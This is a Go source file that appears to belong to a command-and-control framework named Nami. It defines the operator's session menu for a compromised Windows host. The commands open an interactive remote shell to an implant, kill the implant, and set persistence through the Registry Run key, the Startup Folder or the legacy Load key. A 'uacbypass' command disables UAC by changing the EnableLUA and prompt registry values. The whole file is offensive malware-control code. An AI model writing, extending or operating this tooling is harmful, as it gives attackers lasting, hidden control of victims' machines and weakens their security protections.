package NamiPrompt

import (
	"NamiWorker"
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/desertbit/grumble"
)

func SessionsSubCommands(con NamiClient, uuid string) {
	subCommands := &grumble.Command{
		Name:      "shell",
		Help:      "Activate a shell",
		HelpGroup: "Session:",

		Run: func(c *grumble.Context) error {
			reader := bufio.NewReader(os.Stdin)
		out:
			for {
				fmt.Print("shell > ")
				InputCommand, _ := reader.ReadString('\n')
				InputTrim := strings.TrimSuffix(InputCommand, "\r\n")
				switch {
				case InputTrim == "exit":
					break out
				// In case server is run on Linux (TODO: Find better approach)
				case InputTrim == "exit\n":
					break out
				}
				NamiWorker.WG.Add(1)
				NamiWorker.AddJob(InputCommand, uuid)
				NamiWorker.WG.Wait()
			}
			return nil
		},
	}
	killCommands := &grumble.Command{
		Name:      "kill",
		Help:      "Kill the session completely (IE, stop the implant)",
		HelpGroup: "Session:",

		Run: func(c *grumble.Context) error {
			NamiWorker.AddJob("kill_session", uuid)
			fmt.Println(fmt.Sprintf("\n\t[+] Killing session %s\n", uuid))
			con.App.RunCommand([]string{"back"})
			return nil
		},
	}
	backCommands := &grumble.Command{
		Name:      "back",
		Help:      "Back up a section in commands",
		HelpGroup: "Session:",

		Run: func(c *grumble.Context) error {
			con.App.Commands().Remove("shell")
			con.App.Commands().Remove("back")
			con.App.Commands().Remove("kill")
			con.App.Commands().Remove("persistence")
			con.App.Commands().Remove("uacbypass")
			con.App.SetDefaultPrompt()
			return nil
		},
	}
	persistenceCommands := &grumble.Command{
		Name:      "persistence",
		Help:      "Establish persistence mechanism for implant",
		HelpGroup: "Session:",

		Flags: func(f *grumble.Flags) {
			f.BoolL("run", false, "Create Registry \"Run\" value.")
			f.BoolL("startupfolder", false, "Create Startup Folder entry.")
			f.BoolL("load", false, "Create legacy Windows Load Registry value.")
		},

		Run: func(c *grumble.Context) error {
			runKey := c.Flags.Bool("run")
			startupFolder := c.Flags.Bool("startupfolder")
			loadKey := c.Flags.Bool("load")

			if runKey {
				NamiWorker.WG.Add(1)
				fmt.Println("\n\t[*] Executing Registry \"Run\" key persistence.")
				NamiWorker.AddJob("persistence_run", uuid)
				NamiWorker.WG.Wait()
			}
			if startupFolder {
				NamiWorker.WG.Add(1)
				fmt.Println("\n\t[*] Executing Startup Folder persistence.")
				NamiWorker.AddJob("persistence_startupfolder", uuid)
				NamiWorker.WG.Wait()
			}
			if loadKey {
				NamiWorker.WG.Add(1)
				fmt.Println("\n\t[*] Executing legacy Windows Load key persistence.")
				NamiWorker.AddJob("persistence_load", uuid)
				NamiWorker.WG.Wait()
			}
			return nil
		},
	}
	uacCommands := &grumble.Command{
		Name:      "uacbypass",
		Help:      "Disable or bypass UAC on the device",
		HelpGroup: "Session:",

		Flags: func(f *grumble.Flags) {
			f.BoolL("registry", false, "Modify EnableLUA/Prompt Registry values (requires admin)")
		},

		Run: func(c *grumble.Context) error {
			regKey := c.Flags.Bool("registry")

			if regKey {
				NamiWorker.WG.Add(1)
				fmt.Println("\n\t[*] Executing Registry-based UAC bypass.")
				NamiWorker.AddJob("uac_registry", uuid)
				NamiWorker.WG.Wait()
			}
			return nil
		},
	}
	con.App.AddCommand(persistenceCommands)
	con.App.AddCommand(uacCommands)
	con.App.Commands().Add(subCommands)
	con.App.Commands().Add(backCommands)
	con.App.Commands().Add(killCommands)
}
